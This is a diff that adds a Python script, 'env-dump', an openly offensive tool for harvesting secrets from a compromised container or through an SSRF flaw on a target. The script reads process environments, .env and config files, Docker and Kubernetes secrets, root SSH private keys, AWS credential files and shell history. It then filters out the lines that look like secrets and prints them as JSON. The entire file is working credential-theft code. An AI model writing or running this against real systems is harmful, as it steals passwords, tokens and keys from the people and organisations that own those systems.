@@ -1,0 +1,149 @@
+#!/usr/bin/env python3
+"""env-dump — extract env vars and secrets from common leak locations.
+
+Tests /proc/self/environ, /etc/environment, common .env paths, docker secrets,
+k8s service account tokens, and app config files. Run directly from inside a
+container (RCE) or use --ssrf-url to route file reads through an SSRF sink.
+
+Usage:
+  env-dump --direct
+  env-dump --ssrf-url "http://target/read?path=PAYLOAD"
+  env-dump --ssrf-url "http://target/fetch?url=PAYLOAD" --url-prefix "file://"
+"""
+import sys, json, argparse, re, time
+try:
+    import urllib.request, urllib.error, urllib.parse
+except ImportError:
+    pass
+
+TARGETS = [
+    # Process environment
+    ("/proc/self/environ",                      "process_env"),
+    ("/proc/1/environ",                         "pid1_env"),
+    # System env
+    ("/etc/environment",                        "system_env"),
+    ("/etc/profile",                            "profile"),
+    # App config
+    ("/.env",                                   "dotenv_root"),
+    ("/app/.env",                               "dotenv_app"),
+    ("/var/www/.env",                           "dotenv_www"),
+    ("/app/config.env",                         "config_env"),
+    ("/app/config.json",                        "config_json"),
+    ("/app/config.yaml",                        "config_yaml"),
+    ("/app/settings.py",                        "django_settings"),
+    ("/app/config/database.yml",                "rails_db"),
+    # Secrets
+    ("/run/secrets",                            "docker_secrets_dir"),
+    ("/var/run/secrets/kubernetes.io/serviceaccount/token", "k8s_token"),
+    ("/var/run/secrets/kubernetes.io/serviceaccount/namespace", "k8s_namespace"),
+    # History / shell
+    ("/root/.bash_history",                     "root_bash_history"),
+    ("/home/app/.bash_history",                 "app_bash_history"),
+    # SSH
+    ("/root/.ssh/id_rsa",                       "root_ssh_key"),
+    ("/root/.ssh/authorized_keys",              "root_authorized_keys"),
+    # AWS
+    ("/root/.aws/credentials",                  "aws_creds"),
+    ("/home/app/.aws/credentials",              "aws_creds_app"),
+]
+
+SECRET_PATTERNS = re.compile(
+    r'(password|passwd|secret|api.?key|token|bearer|auth|credential|private.?key'
+    r'|aws_access|aws_secret|database_url|db_pass|jwt_secret|encryption_key)',
+    re.IGNORECASE
+)
+
+def read_direct(path):
+    try:
+        with open(path, "rb") as f:
+            raw = f.read(4096)
+        # /proc/self/environ uses null-byte separators
+        if b"\x00" in raw:
+            text = "\n".join(raw.decode(errors="replace").split("\x00"))
+        else:
+            text = raw.decode(errors="replace")
+        return True, text
+    except PermissionError:
+        return False, "permission denied"
+    except FileNotFoundError:
+        return False, "not found"
+    except Exception as e:
+        return False, str(e)
+
+def read_via_ssrf(ssrf_url, path, url_prefix, headers, timeout=8):
+    payload = url_prefix + path
+    if "PAYLOAD" in ssrf_url:
+        url = ssrf_url.replace("PAYLOAD", urllib.parse.quote(payload, safe=""))
+    else:
+        url = ssrf_url + urllib.parse.quote(payload, safe="")
+    try:
+        req = urllib.request.Request(url, headers=headers)
+        with urllib.request.urlopen(req, timeout=timeout) as r:
+            body = r.read(4096).decode(errors="replace")
+            return r.status == 200, body
+    except urllib.error.HTTPError as e:
+        return False, f"HTTP {e.code}"
+    except Exception as e:
+        return False, str(e)
+
+def extract_secrets(text):
+    secrets = []
+    for line in text.splitlines():
+        if SECRET_PATTERNS.search(line):
+            secrets.append(line.strip()[:200])
+    return secrets[:20]
+
+def main():
+    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
+    ap.add_argument("--direct",     action="store_true")
+    ap.add_argument("--ssrf-url",   default="")
+    ap.add_argument("--url-prefix", default="file://", help="Prefix before path for SSRF file reads")
+    ap.add_argument("--header",     action="append", default=[], metavar="K:V")
+    args = ap.parse_args()
+
+    if not args.direct and not args.ssrf_url:
+        ap.error("Provide --direct or --ssrf-url")
+
+    headers = {}
+    for h in args.header:
+        if ":" in h:
+            k, v = h.split(":", 1)
+            headers[k.strip()] = v.strip()
+
+    results = []
+    all_secrets = []
+
+    for path, label in TARGETS:
+        if args.direct:
+            found, text = read_direct(path)
+        else:
+            found, text = read_via_ssrf(args.ssrf_url, path, args.url_prefix, headers)
+
+        secrets = extract_secrets(text) if found else []
+        all_secrets.extend(secrets)
+
+        results.append({
+            "path":    path,
+            "label":   label,
+            "found":   found,
+            "length":  len(text) if found else 0,
+            "secrets": secrets,
+            "snippet": text[:300] if found and not secrets else "",
+        })
+        if args.direct:
+            time.sleep(0)
+        else:
+            time.sleep(0.1)
+
+    hits = [r for r in results if r["found"]]
+    print(json.dumps({
+        "total_paths": len(TARGETS),
+        "readable":    len(hits),
+        "secret_lines_found": len(all_secrets),
+        "unique_secrets": list(dict.fromkeys(all_secrets))[:30],
+        "readable_paths": [r["path"] for r in hits],
+        "results": hits,
+    }, indent=2))
+
+if __name__ == "__main__":
+    main()
